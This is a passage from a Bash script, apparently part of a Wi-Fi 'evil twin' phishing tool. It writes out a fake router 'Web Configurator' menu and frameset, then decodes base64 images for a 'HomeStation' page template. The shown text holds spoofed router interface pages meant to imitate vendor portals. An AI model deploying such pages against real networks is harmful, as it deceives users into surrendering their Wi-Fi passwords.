lUqNcFYqdAmmo5RpKddpT0Z4IRBv2KkhbkAJoMaRnAL9pQskMcw4FjOJjCBpJPbwTGeiKpoXmMIW
SECJIDhrDkPQiCR6EJoirBOikXjBE9SKTnWikp1GQBJcEWaSKnaSlyt4HBMQMYkug2KUpxewg1/J
mAhDkCGOkeCrCtIwTEm48QIQLdft5JAGQPphkI94LiV6W4NBMAINHWjDIuiwQCk8QhJw6EAn22kI
IHyBEYn4wUXJOV4jnGi1InthBUtgQwLKU774DSJWIAACDmjgvwAOsIAHTOACG/jACE6wghfM4AYT
GAMesEAFJBAQADs=\"></td></tr><tr bgcolor=\"#C4D3FD\"> 
    <td><img src=\"data:image/gif;base64,R0lGODdhlgAJAMQAAARexHyCnKSuzLTC5JSixLzO9IySrKy63LzK9LzG7Ky23LTG7KSqzMTO/IyW
tARixHyGpKSy1LTC7JyqzIyStKy+5MTS/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAA
lgAJAAAF/OADjGRpnmh6iizQvm4Mz7Ns1/it57w8HYuHcEgsGo9I5G7ZazKfzuiNJWQcEiKVdsvt
ekvZr3hMZkWugbR6zW673/C4fE6v2+9viIMQGSAoBoGCg4SFhoeIh4AGi42BjoyPiZOUlYaQmIx7
AgoSBROgoaKjpKWmp6ipqqusra6nZ34FBwq1tre4ubm0urq0vwrAwsHEw8K8vcm9yMq1xsXQzwcH
AxIIBQ0JC9rbC93f3OHe4gkSCeXo5urp5eDj7+7x5PDi8vTb5uzr++31/vfarjUoYGEgtgIHExpc
iJBhQoQQI0psSFFhRYcYLWrMuHGiR4kcQ1YsSNBCCAA7\"></td></tr><tr bgcolor=\"#C4D3FD\" height=\"11\"> 
    <td>&nbsp;</td></tr><tr align=\"center\" bgcolor=\"#999999\" height=\"1\" valign=\"top,\">
      <td>            </td></tr><tr>
<td class=\"shadow\" align=\"center\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr>
<tr>
<td class=\"highlight\" align=\"center\" bgcolor=\"#999999\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr><tr>
<td class=\"off\" onmouseover=\"this.className='on'; window.status='Wizard Setup '; return true\" onmouseout=\"this.className='off'; window.status=''; return true\" onclick=\"top.main.location.href='info.html'; top.panel.location.href='menu.html';\" height=\"20\" valign=\"middle\">&nbsp; <span class=\"navLink\">Wizard Setup </span></td>
</tr><tr>
<td class=\"shadow\" align=\"center\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr>
<tr>
<td class=\"highlight\" align=\"center\" bgcolor=\"#999999\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr><tr>
<td class=\"off\" onmouseover=\"this.className='on'; window.status=''; return true\" onmouseout=\"this.className='off'; window.status=''; return true\" onclick=\"top.location.href='javascript:void(0)';\" height=\"20\" valign=\"middle\">&nbsp; <span class=\"navLink\"></span></td>
</tr><tr>
<td class=\"shadow\" align=\"center\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr>
<tr>
<td class=\"highlight\" align=\"center\" bgcolor=\"#999999\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr><tr>
<td class=\"off\" onmouseover=\"this.className='on'; window.status='Advanced Setup '; return true\" onmouseout=\"this.className='off'; window.status=''; return true\" onclick=\"top.main.location.href='info.html'; top.panel.location.href='menu.html';\" height=\"20\" valign=\"middle\">&nbsp; <span class=\"navLink\">Advanced Setup </span></td>
</tr><tr>
<td class=\"shadow\" align=\"center\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr>
<tr>
<td class=\"highlight\" align=\"center\" bgcolor=\"#999999\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr><tr>
<td class=\"off\" onmouseover=\"this.className='on'; window.status=''; return true\" onmouseout=\"this.className='off'; window.status=''; return true\" onclick=\"top.location.href='javascript:void(0)';\" height=\"20\" valign=\"middle\">&nbsp; <span class=\"navLink\"></span></td>
</tr><tr>
<td class=\"shadow\" align=\"center\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr>
<tr>
<td class=\"highlight\" align=\"center\" bgcolor=\"#999999\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr><tr>
<td class=\"off\" onmouseover=\"this.className='on'; window.status='Maintenance'; return true\" onmouseout=\"this.className='off'; window.status=''; return true\" onclick=\"top.main.location.href='info.html'; top.panel.location.href='menu.html';\" height=\"20\" valign=\"middle\">&nbsp; <span class=\"navLink\">Maintenance</span></td>
</tr><tr>
<td class=\"shadow\" align=\"center\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr>
<tr>
<td class=\"highlight\" align=\"center\" bgcolor=\"#999999\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr><tr>
<td class=\"off\" onmouseover=\"this.className='on'; window.status=''; return true\" onmouseout=\"this.className='off'; window.status=''; return true\" onclick=\"top.location.href='javascript:void(0)';\" height=\"20\" valign=\"middle\">&nbsp; <span class=\"navLink\"></span></td>
</tr><tr>
<td class=\"shadow\" align=\"center\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr>
<tr>
<td class=\"highlight\" align=\"center\" bgcolor=\"#999999\"><img src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\" height=\"1\" width=\"1\"></td>
</tr><tr>
<td class=\"off\" onmouseover=\"this.className='on'; window.status='Logout '; return true\" onmouseout=\"this.className='off'; window.status=''; return true\" onclick=\"top.main.location.href='info.html'; top.panel.location.href='menu.html';\" height=\"20\" valign=\"middle\">&nbsp; <span class=\"navLink\">Logout </span></td>
</tr>

		<tr bgcolor=\"#0061C2\" style=\"background-image: url(data:image/gif;base64,R0lGODlhlgABAKIAAMDP+LvI76+94qGu0ABhwgAAAAAAAAAAACwAAAAAlgABAAADDUi63P4wykmr
vXgOERIAOw==)\"> 
    <td><p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
    </td></tr></tbody></table>
</body>
</html>
">$DUMP_PATH/data/menu.html
}

function index {
echo "<html>
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">


  
<title>Web Configurator</title>


<link rel=\"stylesheet\" type=\"text/css\" href=\"data/info.css\" media=\"all\">
</head>
<frameset cols=\"150,*\" rows=\"*\" frameborder=\"NO\" border=\"0\" bordercolor=\"#000000\">
    <frame src=\"data/menu.html\" name=\"panel\" noresize=\"\" frameborder=\"NO\" bordercolor=\"#000000\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"NO\">

	
	<frameset cols=\"*\" rows=\"78,*\" frameborder=\"NO\" border=\"0\" bordercolor=\"#000000\">
	 	
	    <frame src=\"data/logo.html\" name=\"title\" noresize=\"\" frameborder=\"NO\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"NO\">        
        <frame src=\"data/info.html\" name=\"main\" noresize=\"\" frameborder=\"NO\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"AUTO\">
	</frameset></frameset>
</html>
">$DUMP_PATH/index.htm
}

error && final && infocss && info && logo && menu && index

}

# Crea contenido de la iface HomeStation
function HOMESTATION {

mkdir $DUMP_PATH/data &>$linset_output_device

function HomeStationImages {
echo "iVBORw0KGgoAAAANSUhEUgAAAmgAAAAoCAYAAABKKAYMAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJ
bWFnZVJlYWR5ccllPAAAF3tJREFUeNrsnQmUFdWZx++tqrf0SkMvgRaURZbg1ook4pARI6iIYcRw
Rh111Mk5mZxMXEAlQZ3RnLgcwRPQc4xOHFxDYKK4Ew0oNopiXCKKRmiGphGBphfo/W1Vdef7+n1F
V7evN3ndXdX93XO+U+9V3fde/d699dX/fncpqZQSix5aK44lrbjh8nbv4fsk7FPCI4n5esd39/qf
6HfMW2Vx+TGfF9Nvt87SF88o5frpU75JyzfqZbfO4fJjPk8med8WXS2d6Yn6KdMh0CAZ+F1gWWAt
YCPBbDqmgX0NBWr7tYIOdr7MEbuDichwkYiMyOTyYz4PCrIs4jsO7CDYP4LFiE0H2wiCLcHl502+
XWZGcIRminwtwf6F+bwoyLr1LyDYBsS/GMf4+VwwVJoTqPBGEVAW7bfpN14Dq/Jh2Q0JvpbDE7j8
mM+Lwgy5omCXgY0BOwcsRI4UHSg6zQywuWAfcPl5k2+iEeHrj/m8KMw871++jUCT9LnjwSaDDScI
k6CaSGU7CjTht3JjPuZjvgETZXgDwEjLPLB/A5sKVkRMR8D2gh0AOwwWJF4uP+ZjPubriSjzlX/p
rUALgxWCjaXCs0k57wfbR5BojWCK/gjsw272SfkxH/Mx38CJs3zYTAdbQM4zDvY+2Eaw18EqRbIL
opzYsUUvF88o/ZrLj/mYj/m6EWffyr+opTMHzL/0VKBJUtKnkrIOukC+QlAopKNK2jWI0C8Vk/mY
b9Dw3bXuFu2uHz/gGz4QZtgSPxmLBuxHYMPANoM9C7YerA5EWJM7P7y36cbB9ZP5mK8f+WY88Gdt
6y0X+YYPhFm3/gVEWJM7P7z3hH/p6SQBVNU4cA4VKIb+toHVIBgdxwLVaIuGfdQBkezfrYHCjQ4k
JPMx32Dmy5+wcYRmRDPAyxYIaedLaY+Dba5QWpVtB9667YI/HPC4QDsTNo+BlYBtB7sf7CMQYTvp
eC6V2zAyHCOSA1ZL+Wq5fjIf8/UN3/pY/oio0rCbswBUS76t5DjY5gJwVUDab+1dMtvT/gUEV0r/
AiJsJx3v0r9AvgHzLz2JoI0H+wEB/B+esEiGOU06ng02CWwEWB5VTqysFlXQtyl06NXEfMznW77C
ya9M1QMt12t6YqrUEidI3SwQQulCyYRSRkMiMvw/INtLHhZnC2Hze3KMa8D+C1uuILoidPwE2FxD
LWDsdhntvvmB/TvYO1w/mY/50s+3Llo4tVlp1yeUNjUu5AmmkgVKCB0AE7pUDSOk6Wn/AuIrpX8B
0RWh4572L10JNI1O9iyRnNmAqvozOnEsTATDwXU4EwIVKAJjmLBaJPt2MQTaQJBeTMzHfL7kw4iZ
EWy6VBqxs41A81ypJ0YqW69XdqDaNkM7ldJxjIgN+ypsM7zJo8IMneAF+FIku1fuw9cgzGowYgY2
B95/H+yfwU4EOySS3S0fUcseuyDK6T3XT+ZjvjTxYcSsydYvjQnt7Calz40rOdIQqj4gVXVY2jv1
5Bg025CqIkNYnvQvILxS+hcQZjUYMQPzhX/pSqDhWiczqYXwV7BPXcdOA5sokoMED5PyLqOKWU9w
2ILQV9xwuenRCsp8zOc7vjHTH5WJyPAHjFDTfKmZw20zuNeK57xpxzMfV0qrVbaBTjYGLqpZKZl5
+9wnGz3Kh2wPi+T09iUgzJaTcMPxMEvArgYrFskuiT+CPUWOE8syQTfKkBNp4/rJfMx37Hwrm0fL
EVrigUZlzDeVHB6S9t5cab+ZJa3HNalqQai1+he4SJvBMncvmeML/wLCbDkJt175FyfS5jWBhhXv
DCq8jwhC0PuzRXKWB4ZBPwarhEp40Pkg9Xc7gyS9ungd8w1RPhQALYcnaHfMW2X7ja9w0vopVjxr
VSDjyNkgxOpBqD1iW8FNS+esfd7NF2ss1pee/0dnWrwXo2foGO8QyQHJ/4n3BdqPzvQhsEtEslvo
TrB3QYRtdvNh65+eJJDg64/5vMSHAmCiEdHKbp3jO//yQrRgSra0Vh22A2djxCxfSzwSlGrT/iU/
fN7NN1qP6fuWnOdZ/wLnmNK/wP6U/gVE2GY3H/oXepLAgPuXziYJnC6S01FRTW6hlgEW5j+IZGgX
p95+IpJTb51wKV5w36FCw/5eBRV3jxcKjPmGLt+w4z7SApk1GVJattQTc4WS1VKzcLaS+avZf3rE
63yhnAPvgeCK4lizQLhulR5sPss2w7vM6LBlZjz7aT0Q0ZTSQsBlepUvhUC7HTZ3g60G+zmIrQYa
a4bOc75ILgp5D9ifqW4GKCIxQyTXKsIxPxZ8bh1ff8w3kHzvx3O1KjuQYQlpx4U2VxOq2lLyVIA1
K3/5Q8/7l6+t0HsguKI41uyIbaxqUvpZGdLelSfNZdma9XREaRoUXkgKZXqVL4VAa+dfQGw10Fiz
XvkX+NyA+5dUEbTjqQAPU9gTK2eQChQhccbGW6Jtim2uaOuPx7BpmC7CGqgYh+AibPFY+THfEOID
gXOqpseukEZ8um5ETgOhlquU3mSbobJ7X7/69dsufGaPl/laxdmk9UVGqGElijMrkfFZIpK/sHrn
xbswc9GUl0uAyzd8IMQugs1SsM/BlpM4yyOHOp/K7mrYv5/y4/iQi0VyvAh2WxTSf/M3OIbRtUq+
/phvoPi+tkOnxpR2Bdh0EDOnmULm6kI1haVdNnbZG69XLJntaf+C4uyFaEFRva2vRHGWKa3PCrTE
wkvDNa3+5bloYUnER3wgxNr5FxJn3/AvsH8/5e/Uv8AxjK4NqH/pKNCwIp5E+zHsidNLMeSHsxuw
zx0H0pW6Lr4JVNg51ELC/uivKIRaTqrUS4n5hhDfd6Y+f6MRrl8stQS23G1lBQ5ZVuYWEDFFViIT
w/ZRr/OBADNAYN5shBrn2GbGzkRLwWXVZfN2+ZGPlsu4XiRnuuGEgE/pyQHXgl0FthXsGpc4w6c0
Y2t4rEh2F+2hVi8uIPks3Tz5+mO+AeFbEym6sU4ZixNKtl5/AakO5Upri6VkUZa0fOFfQIAZIL5u
blDGnAxp7yzUEpctIHHmNz5aLuOofwFx9Sk9OaCdf3GJM8/7l44CDVs4xXQR7aJ92OL5LhXGhyI5
U0WnCoutigy62MrpWD20imIUWpUeq6DM1wu+u9f/BPJd7ju+gomvZerB5sWB8JFbpWblWvHst0Gw
PKuUtltZwU9uu/DpyjY+b5efUvI4PdR4lbL1xkR02O0gznb4kY/GjmEL9VyRXBxyNR0qAPuZSM5+
uw3E2T7Ii7PKcBDvPRR5eQ7sTyLZZbYT8hyh79TYv/iXb9LyjfoKH/K9FC3IbFb64sO2cStGlHKk
9TYIlmc1KXaHhP1J+S9nVzp8Xi8/qGDH1Sv9KkOoxjzNvB3E2Q4/8tHYsW79C4izfZC3S/8CeY7Q
dw64fzE6vJ5AF9ceUpQIfYpIru/yGYV3MeFguxl0HPvod4hkP67mXHyYaCCoVxLzdcFnhBqDWYV/
z7rr0hVH+e6Yt8ryI59uRK8MZBy+Qwol4y0FvwHRcq+yjTwhrZAjXvzAlz9how5C7NeaHi82o3mr
q768ZJ2P+fBGjWofneM6EFlxElg3UYTiAdhXSnkvxMuL/oufg62iVnHQEWeY6GkC7F98wNegjOD2
RFbWB7fMPcpXduscX/qXqNKurLGNO5SQskhL/CYo7XsDQuWBmAmVL5ld6Re+9bF8HYTYr+NKKx6u
masvC1et8zFfO/8CIitOAuuof4F93foXR5y1No6TTxMY0KR1AMR1UbD/tYL2DaNCxfVcdrrylVCB
v0/KVFE4MObBVh/z9YBv2Oj3E0aoodGDUaVe8RVOfvV4I9xwi5R2MB7Jv19ZgS1WIiNhW7hGWPig
n/j0QMs0I9h8UWvXZSLzYZ/zYUv1fJEcG+IsbDmZnOpusCcpKob5fiWS3WA3i+QsM5wxhssX1How
asb+pQd878SHJeqU0ejBqFKv+J6PFh4PHLfYQgYLtcT9AWlvyZB2wkiuEXbQT3wtSpvWqPSLglId
ypLWwz7n65F/AdHWpX/xQtSsM4FWRIWIYT6nlYN9zzh+AMPTR1z7CqmQd9MFiN+Dj4rAheG+D04m
z6MFyHwp+Aonrc8MZlW/HMqpfDeYWfPMfRv+Zbpf+TQ9PlczIida8ewtdiLjkVDOwY2wL+w3Plzv
TGrmeVJLFJqJrL9U7Zi/1ed836fywjEeR6jLExfJHAv23OIZpV9QPpwph+f/Atj/kgPFsTP4qJaX
wZbDZ6ewf/EP3wvRgswqK/DyASv4bo0deGbMsjd961/iSs6NKO3EHGmBcLEe2W+FNsK+sN/4cL2z
hJLngRVmS+svC8PVW33O186/UJfnUf+ils7ssX+Bz3rGv7gF2nHUkqtxhUSLKdTrfpr7RNpiWD5B
34HQkyhMiFP8J4GTCXqsAJkvBV/+hI1BI9yw1gg1zJXSLDTC9VdogZZf3Pv6vxb6kU8PtFyJWzOe
/ZhtBWuj9cf7kq/l8IQszYieC20+U5mhVwcB33kiOSj8E3qPY3vOpcjRBle+K2n7PxS5wHLG6fHX
0n+0GF+DSBvG/sX7fOtj+cF6ZawFm2sKWXjENq5oUfovxi17w5f+pVnprfUzW7MeC0pVO1aP+pJv
ohHJiirtXFAxZkjYrw4CvrT6FxBpnvAvzhi0TGopRKlF5yQcVNhE4T9M2LLLp0KuEW0L8eFAPJyh
g+vD4GMVEM6m9VfyScWmI+FvlHWVYcUNKQe19wkfHoAbBYbzL0kTX4UTinXS4hmlPfnct+IbM/1R
vGATthk6SWEXmRX6XDNiYzTNHG/hsj4+4yua8tL3ND022TbD5co2NmeO2N260KAf+eA8dT0QLVGW
cdi2A9v8zAfngOU0nurdB/AZRV2VP6Cbn/NQdByMjbP+/kbmjHE5k34bB2mfRCLA9Pv11xP/AjeK
PuVTS2f2Gd/K5tGt/iUs7ZOC2EUm7M9jQhuTUHK8LWXcb3zPRgu/B+c/OUPa5QGhNu8yM1qvPz/y
xZSmR4ReEpDqcEDa2/zMB+fQzr/AZxR1VbbzL7Cv1/5loPnckwRy6aQa6D2GQ3HA3SHR9mDYEOXD
WSDuRyDgwMFxBIbQ+6k1OJsu2HQmHLT5iuj9FNi08o2Z/t+n/Hbro4+L5HiLdKYbSfnX9TXfvg9/
1rpz1ClrPtSDzXOMYOP5QmkJywxvCufunwA3v1V+4MvI26sidSfgsstFUk8U2fHg3uqdF3/lfNCP
fFLaY4S0smwr40s45+TjVPzNhw60BQRPOb0vohs6jlNy1sIaTvl2QL4ql8DDB04vpNYv3mQ2YpQJ
9vv6+uvKvzzYPPqUlfdt8TXfTVnJwNNTkZEfNtn6nAZhnI8P2QYBsGmfFZoANz9f+JdyK6zG61EM
PxXFlSzKlvbeS8PVR68/P/KB+h9jK5EF4utLeram3/la/QsInh75F8hX5RJ4Kf2L9MD1546gYWXE
fvYgiZ/htG12iaFmimB1XLztC/oTCqgCoEpfQN/lRL7S8cyuYhJ8+LiN0l58Lq18xaf9AcSn2kAV
wFHGFWngm0UVAmeYXNdffFY8e5myjUrNiJXYVmCPEWiG/1a96Re+YFZ1FAWasvVyM5azwbZC7+AY
LhCgyq98UlrThNIjwFSJEwBaHah/+bDrYAReR9g1CeILIxLfJV+x3xWBwddPg72DY9Qw0kb7fweG
j9OZJpKru+NA4E2D5frr6F9WtYzKUslumUHBly2tZbqmKmNKKwlIe0+T0rFgfeNfqqxgFAUaCJny
XGluCEv1Do7hAgGq/MpnKTlNkyJiCFWJEwAwk4/5jvoX7JoE8dWtf8Exahhp87p/cQQaFhqGMw+4
wu6o8P5O+xwQbPX9lfJKZ/+KGy6vX/TQ2i+oEqACvcpV0d8T3XRL9iJNI5vUS4GWNj64MeJ/tocK
D79jEdxInuzsh+FG0xu+u0Ty+WDX9rKCHhPf0gtWf3zPa9eUSzNjZDj364N+46vff2Zyn9L2mrHc
nwJaHT5v0wlh+5EPBNc2M5q72rYDr9Xupuns/uXD1jt2Fb0l2p5vt5McY6lruQyMxiyhvEfrJxwv
g/N8mJxww2C7/tz+BW6M3/AvcCPplA9uNJ7n+2rJeR+PX/ZGeaa0R35lhQ76je+sYEPrPk2ovcM0
66cAVofP23SuPz/ygSjbNkyYq4PSfm1eqNbyOV+X/sW1XEZK/wLHy+A8O/UvA8nnPIszg1oMTa4Q
b7LMevDAV/e4L/gu7IKcQW9xXZXaNIYHgwTXk9QI57WGziltfODwbyIFjOl0uDls6+qzvbxB5Im2
2VDdpQr47XHHwudEYZjPm3xFU14OV+2YH/U7H/wGzq6air4e9u12/Tauaxbv4tzcUbRBVz9T+Rdw
+O344ObQJV8vbxC94oPfPiY+JwrDfN7key5aGF4Yro76nQ9+46h/gX27Xb+N65rFuzg3dxTNk3yG
q+UTdbWEnPRtFmo7gbZlKcQZRr7GuqJrZSlCh+48mPaK5GMphOjduLMc1+t08v0TbZ/seHOAm8G1
dNxR30+Bvdjh8+48mHDNlpWuVltP09hj5XO6yJjPm3xdiTM/8cF5HILfroFtu4UtuxJndHxQ18/u
/EvHmwPcDHzF53SRMZ83+boSZ37ig/M4BL9dA9t2/qUrcUbHPc9nuFpw6Vq1uthRgCkE06wUJ7GB
8qIg+5H45qSCYhJ6Bzrs39pFdO7iFC3UdPHNcv3x7psDsjzRIS/O/lhAhZhHIdiSFN+HFaG0w/5F
tD9Veov5mM8vfCS2LC6/b88HNwfmYz7m68S/dBRng4XPEH2XOqrXRhJVKMSwH/tkEmgnk0CbReIs
ThEzzDOK3h9I8f2pRFtrZaTlPfo61XW4AVXATWIRFRQWxo1UgDdSAT5BhYefe5DyzKL3pSm+v7VQ
U03z72W3DfMxH/P5nA9uQBVwk0g7X6pp/r3stmE+5mO+PuIzRP+m7STCQimia07I8hVXZOyA8FEC
Z76S1mXKSxEpdNZSOdelnEuZj/mYj/l6ksCZr6R1mZiP+ZhvCPD1t0BDIfbjDvs+F23jxWrJcJLB
Ka7I2zrR+3XP+j1RN8snHXY/6BKf28hwEOJNtK9CJBfPq2M+5mM+5ussUTcL8zEf8w0Rvv5+MGiM
Tti9JlqqhWxDHURdgU9ENhbCi6L9+LtUC93ldVDfJczHfMzHfMzHfMzHfAMl0JznYuHyF1tp3yiX
YMsnKwX7vfBfF2cd2AKafr+Idp/jKtASMlwDRQr/dSExH/Mx3wAltXRmHdgCWl6A+ZiP+QY5X392
cWIkbBK9rnW9jpNAQzGGMzZxJud22p/jl8Kj7pVr6S2GOa9xqe4K0TZoEGdoPEj7xzIf8zEf83WX
qHuF+ZiP+YYQX18INBRWOFMzX7SPgKEgm5Yi/+e03SySy2PkpMgX6+S3UNCd4d7RDzM48Y/PI6Xs
VshYeHemyP8gba+jwhubIl9n/dOz4MZzZz/XReZjPuYbInxw42E+5mM+j/L1hUA7INqWz9ju2u+8
HkXbJtrnzNh0JgNMpjxBynNAdL7e2Rmibd21/kpYaM702pWu/c7rc2hbQYW3zfX+dCroc6gSVJAw
7Ww9lDvFN9eOYz7mYz7mYz7mY75Bztf6qKd0pkUPrS0WbQvFlon09jOj8DufXq8hETe2s0jeihsu
357u0oMW9SzRtpAcrmZ+XTf5e/P1WDFeoNfjqJAv6Uzp47ICzMd8zDd4+KBF3Y5PLZ15XTf5+4wP
lxVgPuZjvoHj6wuBJkgVTnJF1LAbMx3LZODyG/kUbVuTKoP7uWF9lcDpPyHa+qNLRVuf87EmnJ5b
Qsq79TljqRbKZD7mY77BywdOv9/4Ui2UyXzMx3ze4OurSQLvuaJbxSL93ZBbxcCmRS71O0ukPwy7
iPmYj/mYj/mYj/mGLl9fLbPhLKeB6rM2zd9bKr75nM9+Tc50fpEcGLgtjV9dR9/5IvMxH/MNTT5n
Oj/zMR/zDW2+tHdxcuLEiRMnTpw4cTq2pPFfwIkTJ06cOHHi5K30/wIMAD6foyIl/wsqAAAAAElF
TkSuQmCC" | base64 --decode>$DUMP_PATH/data/3G.png

echo "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
